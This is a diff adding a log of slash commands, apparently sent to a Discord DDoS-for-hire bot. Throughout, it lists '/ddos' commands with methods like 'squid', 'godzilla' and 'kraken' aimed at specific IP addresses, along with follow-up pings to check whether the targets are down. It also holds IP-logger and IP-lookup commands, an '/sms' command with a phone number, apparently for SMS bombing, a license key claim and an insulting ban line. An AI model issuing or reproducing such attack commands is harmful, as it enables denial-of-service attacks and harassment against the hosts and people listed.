@@ -1,0 +1,77 @@
+/plan
+/ddos squid 74.137.106.199 120 80
+/ddos squid 99.115.171.145 120 80
+/ddos squid 89.101.211.42 120 80
+/ping 89.101.211.42
+/ddos squid 89.101.211.42 120 80
+/ping 89.101.211.42
+/ping 89.101.211.42
+/sms
+/sms 3153803305
+/lag
+/plan
+/iplogger
+/checkip 107.77.89.93
+/help
+/checkip 104.229.198.97
+/ddos 104.229.198.97 120 80
+/ddos squid 104.229.198.97 120 80
+/ping 104.229.198.97
+/ping 104.229.198.97
+/ddos squid 104.229.198.97 120 80
+/ping 104.229.198.97
+/ping 104.229.198.97
+/checkip 212.103.48.156
+/ddos squid 212.103.48.156 120 80
+/ping 212.103.48.156
+/ddos squid 212.103.48.156 1200 80
+/ddos squid 212.103.48.156 120 80
+/ping 212.103.48.156
+/ping 212.103.48.156
+/ping 212.103.48.156
+/ping 212.103.48.156
+/ping 212.103.48.156
+/checkip 75.172.237.205
+/ban <@682521245136191531>
+/plan
+/ddos squid 104.229.198.97 120 80
+/ddos squid 104.229.198.97 120 80
+/ping 104.229.198.97
+/ping 104.229.198.97
+/ddos squid 193.238.109.98 120 80
+/ddos 193.238.109.98 squid 120 80
+/serverinfo
+/ddos 193.238.109.98 Godzilla 120 80
+/ddos godzilla 193.238.109.98 120 80
+/ddos godzilla godzilla 193.238.109.98 120 80
+/ddos godzilla http 193.238.109.98 120 80
+/ddos godzilla squid 193.238.109.98 120 80
+/methods
+/ddos godzilla vse 193.238.109.98 120 80
+/ping 193.238.109.98
+/ping 193.238.109.98
+/tr4p
+/lag
+/sms
+/ddos godzilla vse 104.229.198.97 121 80
+/ddos squid 104.229.198.97 1200 80
+/ddos kraken squid 104.229.198.97 1200 80
+/ddos kraken squid 104.229.198.97 1200 80
+/ddos kraken squid 104.229.198.97 120 80
+/ddos kraken squid 104.229.198.97 1200 80
+/ddos kraken squid 104.229.198.97 120 80
+/ban <@682521245136191531>
+/ban <@682521245136191531> is nonce
+/getplan <@548754982787088396>
+/ddos
+/plan
+/ddos Kraken squid 104.229.198.97 120 80
+/claim TRAxJzraOXeQjHUAVHNE1GFVebEEqihBubSDvAMx7KOnYnOuyJ
+/iplogger
+/vpn
+/vpn
+/vpn
+/vpn
+/vpn
+/vpn
+/claim key TRAxJzraOXeQjHUAVHNE1GFVebEEqihBubSDvAMx7KOnYnOuyJ
